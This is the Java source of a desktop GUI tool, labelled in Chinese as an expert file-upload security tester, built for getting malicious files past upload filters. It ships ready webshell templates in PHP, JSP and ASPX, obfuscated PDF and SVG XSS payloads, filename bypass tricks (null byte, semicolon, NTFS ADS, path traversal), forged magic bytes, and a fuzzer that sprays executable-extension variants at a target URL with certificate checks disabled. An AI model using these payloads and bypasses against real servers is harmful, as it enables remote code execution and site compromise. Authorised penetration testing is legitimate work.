package com.security.tool;

import com.formdev.flatlaf.FlatIntelliJLaf;
import com.formdev.flatlaf.FlatDarkLaf;
import okhttp3.*;
import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.border.TitledBorder;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.datatransfer.*;
import java.awt.dnd.*;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.List;
import java.util.concurrent.TimeUnit;
import javax.net.ssl.*;

public class ModernUploadGui extends JFrame {
    private JTextField urlField, proxyField, fieldNameField, filenameField;
    private JTextArea headerArea, payloadEditor, rawPreview, responseArea;
    private JComboBox<String> tplCombo, ctCombo, methodCombo, magicCombo;
    private JCheckBox dotCheck, spaceCheck, upperCheck, nullCheck, semiCheck, pathCheck, adsCheck;
    private JCheckBox rawModeCheck, insecureCheck, themeToggleCheck, proxyEnableCheck;
    private JLabel statusLabel;
    private javax.swing.Timer previewTimer;

    // --- 1. 实战全量 MIME 字典 ---
    private static final String[] ALL_MIME_TYPES = {
        "image/jpeg", "image/png", "image/gif", "image/svg+xml", "image/webp", "image/bmp", "image/x-icon", "image/tiff",
        "application/octet-stream", "application/pdf", "text/html", "text/plain", "text/css", "text/javascript",
        "application/xml", "text/xml", "application/json", "application/javascript",
        "application/x-php", "text/x-php", "application/x-httpd-php", "application/x-httpd-php-source",
        "application/jsp", "application/x-jsp", "text/x-jsp",
        "application/asp", "application/x-asapi", "application/x-aspx",
        "application/zip", "application/x-rar-compressed", "application/x-7z-compressed", "application/x-tar",
        "application/msword", "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "application/vnd.ms-excel", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "video/mp4", "video/x-msvideo", "audio/mpeg", "message/rfc822", "multipart/alternative"
    };

    // --- 2. 专家级 Payload 库 ---
    private static final Map<String, Object[]> TEMPLATES = new LinkedHashMap<>();
    static {
        TEMPLATES.put("-- 漏洞模板 --", new Object[]{"exploit.php", "image/jpeg", ""});
        TEMPLATES.put("PHP-Bypass(拼接免杀)", new Object[]{"shell.php", "image/jpeg", "<?php $k='ev'.'al'; @$k($_POST[1]);?>"});
        TEMPLATES.put("JSP-Reflection(反射执行)", new Object[]{"shell.jsp", "application/octet-stream", "<% Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),request.getParameter(\"c\")); %>"});
        TEMPLATES.put("ASPX-One-Line(经典一句话)", new Object[]{"shell.aspx", "application/octet-stream", "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"pass\"],\"unsafe\");%>"});
        TEMPLATES.put("PDF-XSS-Bypass(全混淆版)", new Object[]{"exploit.pdf", "application/pdf", "%PDF-1.7\n1 0 obj\n<< /#54#79#70#65 /#43#61#74#61#6c#6f#67 /#50#61#67#65#73 2 0 R /#4f#70#65#6e#41#63#74#69#6f#6e 3 0 R >>\nendobj\n" + "2 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n3 0 obj\n" + "<< /#53 /#4a#61#76#61#53#63#72#69#70#74 /#4a#53 <6170702e616c657274282758535320427970617373212729> >>\nendobj\n" + "4 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n%%EOF"});
        TEMPLATES.put("SVG-XSS(内置JS图片)", new Object[]{"test.svg", "image/svg+xml", "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.domain)</script></svg>"});
    }

    public ModernUploadGui() {
        setupUI();
        setTitle("文件上传安全测试专家版 v8.2 [终极稳定修复]");
        setSize(1450, 950);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        setLocationRelativeTo(null);
        enableDragAndDrop();

        previewTimer = new javax.swing.Timer(300, e -> generatePreview());
        previewTimer.setRepeats(false);
        generatePreview();
    }

    private void setupUI() {
        JPanel mainContainer = new JPanel(new BorderLayout(5, 5));
        mainContainer.setBorder(new EmptyBorder(10, 10, 10, 10));

        JPanel topPanel = new JPanel(new GridBagLayout());
        topPanel.setBorder(BorderFactory.createTitledBorder(" 核心配置与 Bypass 矩阵 "));
        GridBagConstraints g = new GridBagConstraints();
        g.fill = GridBagConstraints.HORIZONTAL; g.insets = new Insets(4, 8, 4, 8);

        DocumentListener autoSync = new DocumentListener() {
            public void insertUpdate(DocumentEvent e) { previewTimer.restart(); }
            public void removeUpdate(DocumentEvent e) { previewTimer.restart(); }
            public void changedUpdate(DocumentEvent e) { previewTimer.restart(); }
        };

        g.gridx = 0; g.gridy = 0; topPanel.add(new JLabel("目标 URL:"), g);
        g.gridx = 1; g.gridwidth = 3; urlField = new JTextField("https://httpbin.org/post"); 
        urlField.getDocument().addDocumentListener(autoSync); topPanel.add(urlField, g);
        g.gridwidth = 1; g.gridx = 4; topPanel.add(new JLabel("方法:"), g);
        g.gridx = 5; methodCombo = new JComboBox<>(new String[]{"POST", "PUT", "PATCH"}); 
        methodCombo.addActionListener(e -> previewTimer.restart()); topPanel.add(methodCombo, g);

        g.gridx = 0; g.gridy = 1; topPanel.add(new JLabel("漏洞模板:"), g);
        g.gridx = 1; tplCombo = new JComboBox<>(TEMPLATES.keySet().toArray(new String[0]));
        tplCombo.addActionListener(e -> applyTemplate()); topPanel.add(tplCombo, g);
        
        g.gridx = 2; JPanel proxyWrap = new JPanel(new BorderLayout(5,0));
        proxyEnableCheck = new JCheckBox("代理:"); 
        proxyField = new JTextField("127.0.0.1:8080");
        proxyWrap.add(proxyEnableCheck, BorderLayout.WEST); proxyWrap.add(proxyField, BorderLayout.CENTER);
        proxyEnableCheck.addActionListener(e -> previewTimer.restart()); topPanel.add(proxyWrap, g);

        g.gridx = 4; topPanel.add(new JLabel("幻数伪造:"), g);
        g.gridx = 5; magicCombo = new JComboBox<>(new String[]{"None", "JPEG", "PNG", "GIF89a", "PDF"}); 
        magicCombo.addActionListener(e -> previewTimer.restart()); topPanel.add(magicCombo, g);

        g.gridx = 0; g.gridy = 2; topPanel.add(new JLabel("参数名:"), g);
        g.gridx = 1; fieldNameField = new JTextField("file"); 
        fieldNameField.getDocument().addDocumentListener(autoSync); topPanel.add(fieldNameField, g);
        g.gridx = 2; topPanel.add(new JLabel("文件名:"), g);
        g.gridx = 3; filenameField = new JTextField("shell.php"); 
        filenameField.getDocument().addDocumentListener(autoSync); topPanel.add(filenameField, g);
        g.gridx = 4; topPanel.add(new JLabel("MIME类型:"), g);
        g.gridx = 5; ctCombo = new JComboBox<>(ALL_MIME_TYPES);
        ctCombo.setEditable(true); ctCombo.addActionListener(e -> previewTimer.restart()); topPanel.add(ctCombo, g);

        JPanel bypassGrid = new JPanel(new FlowLayout(FlowLayout.LEFT, 15, 0));
        dotCheck = new JCheckBox("."); spaceCheck = new JCheckBox("空格"); upperCheck = new JCheckBox("大小写");
        nullCheck = new JCheckBox("%00"); semiCheck = new JCheckBox(";"); pathCheck = new JCheckBox("../"); adsCheck = new JCheckBox("ADS");
        JCheckBox[] checks = {dotCheck, spaceCheck, upperCheck, nullCheck, semiCheck, pathCheck, adsCheck};
        for(JCheckBox cb : checks) { cb.addActionListener(e -> previewTimer.restart()); bypassGrid.add(cb); }
        bypassGrid.add(new JLabel("Bypass组合:"), 0);
        g.gridy = 3; g.gridx = 0; g.gridwidth = 6; topPanel.add(bypassGrid, g);

        headerArea = new JTextArea(4, 50);
        headerArea.setText("User-Agent: ExpertUploader/8.2\nCookie: ");
        headerArea.getDocument().addDocumentListener(autoSync);
        headerArea.setFont(new Font("Consolas", Font.PLAIN, 12));
        
        JPanel modeControl = new JPanel(new FlowLayout(FlowLayout.LEFT, 15, 0));
        rawModeCheck = new JCheckBox("[RAW] 发送模式"); // 移除 Emoji
        insecureCheck = new JCheckBox("忽略 SSL", true);
        themeToggleCheck = new JCheckBox("暗黑模式");
        themeToggleCheck.addActionListener(e -> toggleTheme());
        modeControl.add(rawModeCheck); modeControl.add(insecureCheck); modeControl.add(themeToggleCheck);

        JPanel northWrap = new JPanel(new BorderLayout());
        northWrap.add(topPanel, BorderLayout.CENTER);
        JPanel southSub = new JPanel(new BorderLayout());
        southSub.add(new JScrollPane(headerArea), BorderLayout.CENTER);
        southSub.add(modeControl, BorderLayout.SOUTH);
        northWrap.add(southSub, BorderLayout.SOUTH);

        payloadEditor = createTextArea("1. Payload 编辑 (ISO-8859-1 所见即所得)");
        payloadEditor.getDocument().addDocumentListener(autoSync);
        rawPreview = createTextArea("2. 请求预览 (开启Raw模式可在此手动改包)");
        responseArea = createTextArea("3. 响应结果 (Response Content)");
        rawPreview.setForeground(new Color(0, 128, 0)); 

        JSplitPane splitLeft = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, new JScrollPane(payloadEditor), new JScrollPane(rawPreview));
        splitLeft.setDividerLocation(380);
        JSplitPane splitMain = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, splitLeft, new JScrollPane(responseArea));
        splitMain.setDividerLocation(850);

        statusLabel = new JLabel(" 就绪 | 移除Emoji图标修复方框显示问题 ");
        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 15, 5));
        JButton selBtn = new JButton("[+] 载入文件"); selBtn.addActionListener(e -> openFile());
        JButton fuzzBtn = new JButton("[Fuzz] 变体爆破"); fuzzBtn.addActionListener(e -> startFuzz());
        JButton sendBtn = new JButton(">>> 执行发包"); // 移除 Emoji
        sendBtn.setPreferredSize(new Dimension(160, 40));
        sendBtn.setBackground(new Color(0, 120, 215)); sendBtn.setForeground(Color.WHITE);
        sendBtn.setFont(new Font("微软雅黑", Font.BOLD, 14));
        sendBtn.addActionListener(e -> executeOne());
        
        btnPanel.add(selBtn); btnPanel.add(fuzzBtn); btnPanel.add(sendBtn);
        JPanel bottomBar = new JPanel(new BorderLayout());
        bottomBar.add(statusLabel, BorderLayout.WEST);
        bottomBar.add(btnPanel, BorderLayout.EAST);

        mainContainer.add(northWrap, BorderLayout.NORTH);
        mainContainer.add(splitMain, BorderLayout.CENTER);
        mainContainer.add(bottomBar, BorderLayout.SOUTH);
        add(mainContainer);
    }

    private JTextArea createTextArea(String title) {
        JTextArea a = new JTextArea(); a.setFont(new Font("Consolas", Font.PLAIN, 12));
        a.setBorder(BorderFactory.createTitledBorder(null, title, TitledBorder.LEFT, TitledBorder.TOP, new Font("微软雅黑", Font.BOLD, 12)));
        a.setLineWrap(true); return a;
    }

    private void applyTemplate() {
        Object[] d = TEMPLATES.get(tplCombo.getSelectedItem());
        if(d != null && !((String)d[2]).isEmpty()) {
            filenameField.setText((String)d[0]); ctCombo.setSelectedItem((String)d[1]);
            payloadEditor.setText((String)d[2]);
            previewTimer.restart();
        }
    }

    private String generateBypassName(String base) {
        if(upperCheck.isSelected()) base = base.replace(".php", ".PhP").replace(".jsp", ".JsP").replace(".aspx", ".AsPx");
        if(nullCheck.isSelected()) base += "%00.jpg";
        if(semiCheck.isSelected()) base += ";.jpg";
        if(dotCheck.isSelected()) base += ".";
        if(spaceCheck.isSelected()) base += " ";
        if(pathCheck.isSelected()) base = "../" + base;
        if(adsCheck.isSelected()) base += "::$DATA";
        return base;
    }

    private byte[] getMagicBytes() {
        String magic = (String) magicCombo.getSelectedItem();
        if("GIF89a".equals(magic)) return "GIF89a".getBytes(StandardCharsets.ISO_8859_1);
        if("PNG".equals(magic)) return new byte[]{(byte)0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A};
        if("PDF".equals(magic)) return new byte[]{0x25, 0x50, 0x44, 0x46};
        if("JPEG".equals(magic)) return new byte[]{(byte)0xFF, (byte)0xD8, (byte)0xFF};
        return new byte[0];
    }

    private String getMagicDisplay() {
        String magic = (String) magicCombo.getSelectedItem();
        if("GIF89a".equals(magic)) return "GIF89a";
        if("PNG".equals(magic)) return "\\x89PNG\\r\\n";
        if("PDF".equals(magic)) return "%PDF";
        if("JPEG".equals(magic)) return "\\xFF\\xD8\\xFF";
        return "";
    }

    private void generatePreview() {
        SwingUtilities.invokeLater(() -> {
            try {
                String uRaw = urlField.getText();
                if(uRaw.isEmpty() || !uRaw.startsWith("http")) return;
                URL url = new URL(uRaw);
                String boundary = "----SecurityBound" + System.currentTimeMillis();
                byte[] editedContent = payloadEditor.getText().getBytes(StandardCharsets.ISO_8859_1);
                byte[] magicBytes = getMagicBytes();
                long totalPayloadLen = magicBytes.length + editedContent.length;
                
                StringBuilder sb = new StringBuilder();
                sb.append(methodCombo.getSelectedItem()).append(" ").append(url.getPath().isEmpty() ? "/" : url.getPath()).append(" HTTP/1.1\r\n");
                sb.append("Host: ").append(url.getHost()).append(url.getPort()==-1?"":":"+url.getPort()).append("\r\n");
                sb.append(headerArea.getText().trim()).append("\r\n");
                sb.append("Content-Type: multipart/form-data; boundary=").append(boundary).append("\r\n");
                sb.append("Content-Length: ").append(totalPayloadLen + 250).append("\r\n\r\n");
                sb.append("--").append(boundary).append("\r\n");
                sb.append("Content-Disposition: form-data; name=\"").append(fieldNameField.getText()).append("\"; filename=\"").append(generateBypassName(filenameField.getText())).append("\"\r\n");
                sb.append("Content-Type: ").append(ctCombo.getSelectedItem()).append("\r\n\r\n");
                if(!getMagicDisplay().isEmpty()) sb.append("[MAGIC: ").append(getMagicDisplay()).append("]\n");
                String pText = payloadEditor.getText();
                sb.append(pText.length() > 500 ? pText.substring(0, 500) + "...[省略]" : pText);
                sb.append("\r\n--").append(boundary).append("--");
                rawPreview.setText(sb.toString());
            } catch (Exception e) { }
        });
    }

    private void executeOne() {
        new Thread(() -> {
            try {
                SwingUtilities.invokeLater(() -> statusLabel.setText(">>> 正在发送..."));
                OkHttpClient.Builder ob = (insecureCheck.isSelected() ? getUnsafeBuilder() : new OkHttpClient.Builder());
                if(proxyEnableCheck.isSelected()) {
                    String[] s = proxyField.getText().trim().split(":");
                    ob.proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(s[0], Integer.parseInt(s[1]))));
                } else ob.proxy(Proxy.NO_PROXY);
                
                OkHttpClient client = ob.connectTimeout(15, TimeUnit.SECONDS).build();
                Request request;

                if(rawModeCheck.isSelected()) {
                    String raw = rawPreview.getText();
                    String[] parts = raw.split("\r\n\r\n|\n\n", 2);
                    Request.Builder rb = new Request.Builder().url(urlField.getText());
                    for(String line : parts[0].split("\n")) {
                        if(line.contains(":")) {
                            String[] kv = line.split(":", 2);
                            if(!kv[0].trim().equalsIgnoreCase("Content-Length")) rb.header(kv[0].trim(), kv[1].trim());
                        }
                    }
                    byte[] bodyBytes = (parts.length > 1) ? parts[1].getBytes(StandardCharsets.ISO_8859_1) : new byte[0];
                    request = rb.method((String)methodCombo.getSelectedItem(), RequestBody.create(null, bodyBytes)).build();
                } else {
                    byte[] content = payloadEditor.getText().getBytes(StandardCharsets.ISO_8859_1);
                    byte[] magic = getMagicBytes();
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    bos.write(magic); bos.write(content);
                    Request.Builder rb = new Request.Builder().url(urlField.getText());
                    for(String line : headerArea.getText().split("\n")) { if(line.contains(":")) { String[] kv = line.split(":", 2); rb.header(kv[0].trim(), kv[1].trim()); } }
                    MultipartBody mbody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                            .addFormDataPart(fieldNameField.getText(), generateBypassName(filenameField.getText()), RequestBody.create(MediaType.parse((String)ctCombo.getSelectedItem()), bos.toByteArray()))
                            .build();
                    request = rb.method((String)methodCombo.getSelectedItem(), mbody).build();
                }

                try (Response res = client.newCall(request).execute()) {
                    String body = res.body().string();
                    SwingUtilities.invokeLater(() -> {
                        responseArea.setText("STATUS: " + res.code() + "\n--- Headers ---\n" + res.headers().toString() + "\n--- Body ---\n" + body);
                        statusLabel.setText("完成 | HTTP " + res.code());
                    });
                }
            } catch (Exception ex) { SwingUtilities.invokeLater(() -> responseArea.setText("Error: " + ex.getMessage())); }
        }).start();
    }

    private void startFuzz() {
        String baseName = filenameField.getText().split("\\.")[0];
        List<String> payloads = new ArrayList<>();
        String[] php = {".php", ".php5", ".phtml", ".PhP", ".php.", ".php%00.jpg", ".php;.jpg", ".php::$DATA"};
        String[] jsp = {".jsp", ".jspx", ".jspf", ".Jsp", ".jsp;.jpg", ".jsv"};
        String[] aspx = {".aspx", ".ashx", ".asmx", ".asa", ".cer", ".Aspx", ".aspx;.jpg"};
        for(String e : php) payloads.add(baseName + e);
        for(String e : jsp) payloads.add(baseName + e);
        for(String e : aspx) payloads.add(baseName + e);

        JDialog fuzzWin = new JDialog(this, "Fuzz 变体爆破进度", false);
        fuzzWin.setSize(700, 500); fuzzWin.setLocationRelativeTo(this);
        DefaultTableModel model = new DefaultTableModel(new String[]{"Payload Filename", "Status", "Length"}, 0);
        JTable table = new JTable(model);
        fuzzWin.add(new JScrollPane(table));
        fuzzWin.setVisible(true);

        new Thread(() -> {
            try {
                OkHttpClient client = (insecureCheck.isSelected() ? getUnsafeBuilder() : new OkHttpClient.Builder())
                        .proxy(proxyEnableCheck.isSelected() ? getProxy() : Proxy.NO_PROXY).build();
                for(String p : payloads) {
                    try {
                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                        bos.write(getMagicBytes()); bos.write(payloadEditor.getText().getBytes(StandardCharsets.ISO_8859_1));
                        MultipartBody m = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart(fieldNameField.getText(), p, RequestBody.create(MediaType.parse((String)ctCombo.getSelectedItem()), bos.toByteArray())).build();
                        Request req = new Request.Builder().url(urlField.getText()).post(m).build();
                        try (Response res = client.newCall(req).execute()) {
                            String b = res.body().string();
                            SwingUtilities.invokeLater(() -> model.addRow(new Object[]{p, res.code(), b.length()}));
                        }
                    } catch (Exception e) { SwingUtilities.invokeLater(() -> model.addRow(new Object[]{p, "Error", 0})); }
                }
            } catch (Exception e) {}
        }).start();
    }

    private Proxy getProxy() { 
        String sText = proxyField.getText().trim();
        if(!sText.contains(":")) return Proxy.NO_PROXY;
        String[] s = sText.split(":"); 
        return new Proxy(Proxy.Type.HTTP, new InetSocketAddress(s[0], Integer.parseInt(s[1]))); 
    }

    private void openFile() {
        JFileChooser fc = new JFileChooser();
        if(fc.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
            new Thread(() -> {
                try (FileInputStream fis = new FileInputStream(fc.getSelectedFile())) {
                    byte[] data = new byte[(int)fc.getSelectedFile().length()]; fis.read(data);
                    final String displayContent = new String(data, StandardCharsets.ISO_8859_1);
                    SwingUtilities.invokeLater(() -> {
                        filenameField.setText(fc.getSelectedFile().getName());
                        payloadEditor.setText(displayContent);
                        previewTimer.restart();
                    });
                } catch (Exception e) { }
            }).start();
        }
    }

    private void toggleTheme() {
        try {
            if(themeToggleCheck.isSelected()) UIManager.setLookAndFeel(new FlatDarkLaf());
            else UIManager.setLookAndFeel(new FlatIntelliJLaf());
            SwingUtilities.updateComponentTreeUI(this);
        } catch (Exception e) {}
    }

    private void enableDragAndDrop() {
        new DropTarget(this, new DropTargetAdapter() {
            public void drop(DropTargetDropEvent dtde) {
                try {
                    dtde.acceptDrop(1);
                    List<File> files = (List<File>) dtde.getTransferable().getTransferData(DataFlavor.javaFileListFlavor);
                    if(files.size() > 0) loadFileData(files.get(0));
                } catch (Exception e) {}
            }
        });
    }

    private void loadFileData(File f) {
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] data = new byte[(int)f.length()]; fis.read(data);
            payloadEditor.setText(new String(data, StandardCharsets.ISO_8859_1));
            filenameField.setText(f.getName());
            previewTimer.restart();
        } catch (Exception e) {}
    }

    private OkHttpClient.Builder getUnsafeBuilder() throws Exception {
        TrustManager[] t = new TrustManager[]{ new X509TrustManager() {
            public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
            public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[]{}; }
        }};
        SSLContext sc = SSLContext.getInstance("SSL"); sc.init(null, t, new java.security.SecureRandom());
        return new OkHttpClient.Builder().sslSocketFactory(sc.getSocketFactory(), (X509TrustManager)t[0]).hostnameVerifier((h, s) -> true);
    }

    public static void main(String[] args) {
        FlatIntelliJLaf.setup();
        UIManager.put("defaultFont", new Font("微软雅黑", Font.PLAIN, 12));
        SwingUtilities.invokeLater(() -> new ModernUploadGui().setVisible(true));
    }
}